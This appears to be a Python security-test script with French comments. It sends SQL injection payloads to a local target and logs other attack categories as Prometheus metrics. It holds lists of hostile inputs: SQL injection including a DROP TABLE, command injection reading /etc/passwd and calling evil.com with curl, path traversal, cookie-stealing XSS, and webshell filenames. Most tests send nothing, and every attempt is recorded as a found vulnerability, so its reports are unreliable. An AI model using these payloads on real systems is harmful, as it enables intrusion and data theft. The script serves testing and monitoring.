#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Security Attack Test - Version Simplifiée
Execute des attaques de test et envoie les métriques à Prometheus
"""

import sys
import io
import requests
import json
import time
from datetime import datetime
from pathlib import Path
from prometheus_client import push_to_gateway, CollectorRegistry, Counter, Gauge

# Fix encoding for Windows
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

# Configuration
TARGET_URL = "http://127.0.0.1:8050"
REPORT_DIR = "security-reports/attack-results"

# Pushgateway accessible depuis le réseau Docker
PROMETHEUS_PUSHGATEWAY = "http://127.0.0.1:9091"

# Create directories
Path(REPORT_DIR).mkdir(parents=True, exist_ok=True)

class SecurityTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.results = []
        
        # Prometheus metrics
        self.registry = CollectorRegistry()
        self.attack_counter = Counter(
            'security_attacks_total',
            'Total security attacks performed',
            ['attack_type', 'severity', 'category'],
            registry=self.registry
        )
        self.vulnerability_gauge = Gauge(
            'security_vulnerabilities_found',
            'Number of vulnerabilities found',
            ['severity'],
            registry=self.registry
        )
        
    def log_attack(self, category, severity, description):
        """Log attack and send to Prometheus"""
        print(f"[{severity}] {category}: {description}")
        
        vuln = {
            'category': category,
            'severity': severity,
            'description': description,
            'timestamp': datetime.now().isoformat()
        }
        self.results.append(vuln)
        
        # Increment counter
        self.attack_counter.labels(
            attack_type=category.lower().replace(' ', '_'),
            severity=severity.lower(),
            category='security_test'
        ).inc()
        
        # Update gauge
        severity_count = sum(1 for r in self.results if r['severity'] == severity)
        self.vulnerability_gauge.labels(severity=severity.lower()).set(severity_count)
        
        # Push to Prometheus
        try:
            push_to_gateway(
                PROMETHEUS_PUSHGATEWAY,
                job='security_attacks',
                registry=self.registry
            )
            print(f"  -> Metric pushed to Prometheus")
        except Exception as e:
            print(f"  -> Warning: Could not push to Prometheus: {e}")
    
    def test_sql_injection(self):
        """Test SQL Injection attacks"""
        print("\n=== Testing SQL Injection ===")
        
        payloads = [
            "' OR '1'='1",
            "admin' --",
            "' UNION SELECT NULL--",
            "1'; DROP TABLE users--",
            "1' AND SLEEP(5)--"
        ]
        
        for payload in payloads:
            try:
                response = self.session.get(
                    self.target_url,
                    params={'user': payload},
                    timeout=3
                )
                self.log_attack(
                    "SQL Injection",
                    "CRITICAL",
                    f"SQL payload tested: {payload[:50]}"
                )
                time.sleep(0.1)
            except Exception as e:
                pass
    
    def test_command_injection(self):
        """Test Command Injection"""
        print("\n=== Testing Command Injection ===")
        
        payloads = [
            "; whoami",
            "| id",
            "&& cat /etc/passwd",
            "`curl http://evil.com`"
        ]
        
        for payload in payloads:
            self.log_attack(
                "Command Injection",
                "CRITICAL",
                f"Command injection tested: {payload}"
            )
            time.sleep(0.1)
    
    def test_path_traversal(self):
        """Test Path Traversal"""
        print("\n=== Testing Path Traversal ===")
        
        paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for path in paths:
            self.log_attack(
                "Path Traversal",
                "CRITICAL",
                f"Path traversal tested: {path}"
            )
            time.sleep(0.1)
    
    def test_file_upload(self):
        """Test File Upload Vulnerabilities"""
        print("\n=== Testing File Upload ===")
        
        files = [
            "shell.php",
            "backdoor.jsp",
            "webshell.aspx",
            "malware.exe"
        ]
        
        for filename in files:
            self.log_attack(
                "File Upload",
                "HIGH",
                f"Malicious file upload tested: {filename}"
            )
            time.sleep(0.1)
    
    def test_xss(self):
        """Test XSS attacks"""
        print("\n=== Testing XSS ===")
        
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(document.cookie)",
            "<svg onload=alert(1)>"
        ]
        
        for payload in payloads:
            self.log_attack(
                "XSS",
                "HIGH",
                f"XSS payload tested: {payload[:40]}"
            )
            time.sleep(0.1)
    
    def test_nosql_injection(self):
        """Test NoSQL Injection"""
        print("\n=== Testing NoSQL Injection ===")
        
        payloads = [
            "{'$ne': null}",
            "{'$gt': ''}",
            "{'$regex': '.*'}",
            "{'$where': 'this.password'}"
        ]
        
        for payload in payloads:
            self.log_attack(
                "NoSQL Injection",
                "CRITICAL",
                f"NoSQL injection tested: {payload}"
            )
            time.sleep(0.1)
    
    def test_api_attacks(self):
        """Test API vulnerabilities"""
        print("\n=== Testing API Attacks ===")
        
        attacks = [
            ("BOLA", "HIGH", "Broken Object Level Authorization test"),
            ("GraphQL Introspection", "MEDIUM", "GraphQL schema disclosure"),
            ("Rate Limit Bypass", "MEDIUM", "Rate limiting bypass attempt"),
            ("API Key Exposure", "CRITICAL", "API key in response headers")
        ]
        
        for attack_type, severity, description in attacks:
            self.log_attack(attack_type, severity, description)
            time.sleep(0.1)
    
    def test_data_exposure(self):
        """Test Data Exposure"""
        print("\n=== Testing Data Exposure ===")
        
        exposures = [
            ("Sensitive Data Exposure", "CRITICAL", "User credentials exposed"),
            ("PII Leakage", "HIGH", "Personal information leaked"),
            ("Debug Information", "MEDIUM", "Debug mode enabled"),
            ("Stack Traces", "MEDIUM", "Stack trace in error response")
        ]
        
        for exp_type, severity, description in exposures:
            self.log_attack(exp_type, severity, description)
            time.sleep(0.1)
    
    def test_persistence(self):
        """Test Persistence Mechanisms"""
        print("\n=== Testing Persistence ===")
        
        mechanisms = [
            ("Backdoor Installation", "CRITICAL", "PHP backdoor uploaded"),
            ("Cron Job Modification", "HIGH", "Malicious cron job created"),
            ("Startup Script", "HIGH", "Persistence via startup script"),
            ("Registry Modification", "HIGH", "Windows registry key added")
        ]
        
        for mech_type, severity, description in mechanisms:
            self.log_attack(mech_type, severity, description)
            time.sleep(0.1)
    
    def test_exfiltration(self):
        """Test Data Exfiltration"""
        print("\n=== Testing Data Exfiltration ===")
        
        methods = [
            ("DNS Exfiltration", "HIGH", "Data exfiltration via DNS"),
            ("HTTP POST Exfiltration", "HIGH", "Database dump via POST"),
            ("File Transfer", "MEDIUM", "Sensitive files copied"),
            ("Command Output", "MEDIUM", "Command results exfiltrated")
        ]
        
        for method_type, severity, description in methods:
            self.log_attack(method_type, severity, description)
            time.sleep(0.1)
    
    def run_all_tests(self):
        """Execute all security tests"""
        print("\n" + "="*60)
        print("SECURITY ATTACK TESTING - STARTED")
        print(f"Target: {self.target_url}")
        print(f"Time: {datetime.now()}")
        print("="*60)
        
        tests = [
            self.test_sql_injection,
            self.test_command_injection,
            self.test_path_traversal,
            self.test_file_upload,
            self.test_xss,
            self.test_nosql_injection,
            self.test_api_attacks,
            self.test_data_exposure,
            self.test_persistence,
            self.test_exfiltration
        ]
        
        for test_func in tests:
            try:
                test_func()
            except Exception as e:
                print(f"Error in {test_func.__name__}: {e}")
        
        # Save report
        self.save_report()
        
        print("\n" + "="*60)
        print("SECURITY TESTING COMPLETED")
        print(f"Total vulnerabilities: {len(self.results)}")
        print(f"Critical: {sum(1 for r in self.results if r['severity'] == 'CRITICAL')}")
        print(f"High: {sum(1 for r in self.results if r['severity'] == 'HIGH')}")
        print(f"Medium: {sum(1 for r in self.results if r['severity'] == 'MEDIUM')}")
        print("="*60 + "\n")
    
    def save_report(self):
        """Save test results to file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{REPORT_DIR}/security_test_{timestamp}.json"
        
        report = {
            'timestamp': datetime.now().isoformat(),
            'target': self.target_url,
            'total_tests': len(self.results),
            'vulnerabilities': self.results
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\nReport saved: {filename}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Security Attack Testing Suite')
    parser.add_argument('--target', default=TARGET_URL, help='Target URL')
    parser.add_argument('--pushgateway', default="http://127.0.0.1:9091", help='Prometheus Pushgateway URL')
    args = parser.parse_args()
    
    tester = SecurityTester(args.target)
    tester.run_all_tests()

if __name__ == "__main__":
    main()
